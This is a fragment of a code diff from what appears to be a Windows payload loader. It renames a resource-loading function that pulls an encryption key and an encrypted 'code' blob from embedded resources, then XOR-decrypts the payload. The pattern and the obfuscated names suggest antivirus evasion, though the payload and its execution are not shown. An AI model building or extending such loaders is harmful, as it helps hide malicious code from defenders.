@@ -27,11 +27,11 @@ int main() {
     
     char* key101k;
     DWORD key101kLen;
-    ooooloadrekusigma("dhanushkey1", &key101k, &key101kLen);
+    loadresbabe("dhanushkey1", &key101k, &key101kLen);
 
     char* code199k;
     DWORD code199kLen;
-    ooooloadrekusigma("dhanushcode56", &code199k, &code199kLen);
+    loadresbabe("dhanushcode56", &code199k, &code199kLen);
 
     // Decrypt the payload
     Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
